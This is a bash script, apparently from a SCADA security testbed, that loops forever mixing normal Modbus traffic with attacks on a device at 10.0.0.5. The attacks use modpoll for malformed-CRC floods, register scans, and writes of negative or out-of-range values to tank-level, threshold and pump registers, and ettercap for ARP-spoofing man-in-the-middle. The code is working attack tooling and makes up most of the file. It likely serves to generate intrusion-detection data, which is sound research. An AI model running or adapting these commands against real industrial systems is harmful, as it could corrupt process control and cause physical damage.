# The code in this file is used to launch attacks in SCADA testbed

while [ true ]
do
	IP="10.0.0.5"
	DIV=$((120))
	DIV1=$((3))
	DIV4=$((4))
	R1=$(($RANDOM%$DIV1))
	R=$(($RANDOM%$DIV))
	R4=$(($RANDOM%$DIV4))
	if [ $R -eq 0 ]; then
		if [ $R1 -eq 0 ]; then
		#Incorrect CRC
			if modpoll -r 52210 -0 -1 $IP > \dev\null 2>&1; then
			 for i in {1..70};
			 do
			  modpoll -m enc -t 4 -0 -1 -r 32210 -l 1 $IP;

			 done	  
			 until modpoll -r 52211 -0 -1 $IP > \dev\null 2>&1
				do
				sleep 0.05
				done
			fi
		elif [ $R1 -eq 1 ]; then
		#scan
			if modpoll -r 52210 -0 -1 $IP > \dev\null 2>&1; then
			for i in {1..70};
			do
			 modpoll -t 4 -r 42210 -0 -1 -l 1 $IP;
			done
			 until modpoll -r 52211 -0 -1 $IP > \dev\null 2>&1
			  do
			  sleep 0.05
			  done
			fi
		elif [ $R1 -eq 2 ]; then
		    sudo timeout 3 ettercap -Tqi eth3 -M arp:remote /10.0.0.3// /10.0.0.4//
		    sleep 3		    
		fi
	
	elif [ $R -gt 0 -a $R -lt 30 ]; then			#normal traffic
		if [ $R1 -eq 0 ]; then
		#normal CRC
			modpoll -m enc -t 4 -0 -1 -r 32210 $IP;
			sleep 0.05
		elif [ $R1 -eq 1 ]; then
		#normal scan
			modpoll -r 42210 -t 4 -1 -0 $IP;
			sleep 0.05
		fi
	elif [ $R -gt 30 -a $R -lt 80 ]; then	
		if [ $R4 -eq 0 ]; then
			# Tank level attack
			DIFF=$((100))
			R2=$(($(($RANDOM%$DIFF))+1))

			modpoll -0 -1 -r 42210 $IP -- -$R2;
			modpoll -0 -1 -r 42211 $IP -- -$R2;
			elif [ $R4 -eq 1 ]; then
				# Threshold attack
				DIFF=$((88))
				R2=$(($(($RANDOM%$DIFF))+6))

				modpoll -0 -1 -r 42212 10.0.0.5 $R2;
				modpoll -0 -1 -r 42213 10.0.0.5 $R2;
			elif [ $R4 -eq 2 ]; then
				# Threshold attack
				R2=20
				R3=80

				while [ $R2 -eq "20" ]
				do
					DIFF=$((256))
					R2=$(($RANDOM%$DIFF))
				done

				while [ $R3 -eq "80" ]
				do
					DIFF=$((256))
					R3=$(($RANDOM%$DIFF))
				done

				modpoll -0 -1 -r 42214 10.0.0.5 $R2;
				modpoll -0 -1 -r 42215 10.0.0.5 $R3;
			elif [ $R4 -eq 3 ]; then
				# Pump attack
				DIFF=$((100))
				R2=$(($(($RANDOM%$DIFF))+10))

				modpoll -0 -r 32210 10.0.0.5 -- -$R2
				modpoll -0 -r 32210 10.0.0.5 $R2
		fi
	elif [ $R -gt 80 -a $R -lt 120 ]; then
		if [ $R4 -eq 0 ]; then
				# Tank level normal
				DIFF=$((100))
				R2=$(($RANDOM%$DIFF))

				T2=100-$R2

				modpoll -0 -1 -r 42210 10.0.0.5 $R2;
				modpoll -0 -1 -r 42211 10.0.0.5 $T2;
			elif [ $R4 -eq 1 ]; then
				# Threshold normal
				modpoll -0 -1 -r 42212 10.0.0.5 95;
				modpoll -0 -1 -r 42213 10.0.0.5 5;
			elif [ $R4 -eq 2 ]; then
				# Threshold normal
				modpoll -0 -1 -r 42214 10.0.0.5 80;
				modpoll -0 -1 -r 42215 10.0.0.5 20;
			elif [ $R4 -eq 3 ]; then
				# Pump normal
				DIFF=$((10))
				R2=$(($RANDOM%$DIFF))
		
				if [ $R2 -ne 0 ]
				then
					modpoll -0 -r 32210 10.0.0.5 -- -$R2
				fi
				modpoll -0 -r 32210 10.0.0.5 $R2
		fi
	fi
done
